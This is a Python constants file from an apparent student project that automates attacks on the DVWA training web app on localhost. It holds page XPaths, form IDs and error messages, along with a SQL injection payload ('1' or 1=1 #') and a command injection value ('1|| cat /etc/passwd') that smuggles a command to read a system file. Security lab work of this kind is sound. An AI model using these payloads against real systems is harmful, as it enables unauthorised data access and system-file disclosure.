# -*- coding: utf-8 -*-
"""
Created on Wed Nov  2 00:39:24 2022

@author: Callum Manning

Strath Uni - 201720173
"""

#Kali Set Up
KALI_SET_UP_PRINT = 'First we must start mysql and apache, this will also allow python to use your sudo pass unimpeached'


#XPATHS
SQL_INJECTION_XPATH = '/html/body/div/div[2]/div/ul[2]/li[7]/a'
DVWA_SECURITY_XPATH = '/html/body/div/div[2]/div/ul[3]/li[1]/a'
HIGH_SECURITY_SQLINJECTLINK = '/html/body/div/div[3]/div/div/a'

BRUTE_FORCE_XPATH = '/html/body/div/div[2]/div/ul[2]/li[1]/a'
COMMAND_INJECTION_XPATH = '/html/body/div/div[2]/div/ul[2]/li[2]/a'
BRUTE_FORCE_PASS_XPATH = '/html/body/div/div[3]/div/div/p'
#URLS
URL_VM = 'http://127.0.0.1'
URL_HOST = 'http://127.0.0.1:8080'
LOGIN_EXT = '/dvwa/login.php'

#Web Element ID
LOGIN_UNAME_BOX_ID = 'username'
LOGIN_PASS_BOX_ID = 'password'
SQL_I_INSERT_BOX_ID = 'id'
COMS_I_INSERT_BOX_IP = 'ip'
DVWA_SECURITY_DROP_ID = 'security'
DVWA_SECURITY_SUBMIT_ID = 'seclev_submit'
SQL_I_DROP_ID ='option'
SUBMIT_BUTTON_ID = 'Submit'

#Errors
BROWSER_CHOICE_ERROR = 'Error: setting up browser ' 
GET_ELEM_ERROR = 'Error: getting element ID '
SEND_INFO_ERROR ='Error: Sending info to element '
WAIT_FOR_ELEM_ERROR ='Error: Waiting for element to appear ' 
LOG_IN_PAGE_ERROR = 'Error: This is Not the Log in Page'
SCRIPT_EXECUTION_ERROR = 'Error: Script could not execute '

#SQLI SET UP
SQLI_ATTACK_DETAILS = ["1","'", " or", " 1=1", " #"]
OPTION_INJECT =['''arguments[0].value = "''','''"''' ]
SQLI_ATTACK_DEFAULT = ' '.join(SQLI_ATTACK_DETAILS)
SQLI_OPTION_INJECT_DEFAULT = OPTION_INJECT[0]  + SQLI_ATTACK_DETAILS[0] + ' '.join(SQLI_ATTACK_DETAILS[2:4]) + OPTION_INJECT[1]

#COMSI SET UP
COMSI_ATTACK_DEFAULT = '1|| cat /etc/passwd'

#User Warning
MED_FAIL_WARNING ='Delibrate Failures: Medium level, easy attack -> ignore errors'
HARD_FAIL_WARNING = 'Delibrate Failures: Hard level, easy attack -> ignore errors'
IMPOSS_FAIL_WARNING = 'Delibrate Failures: Impossible level, easy attack -> ignore errors'
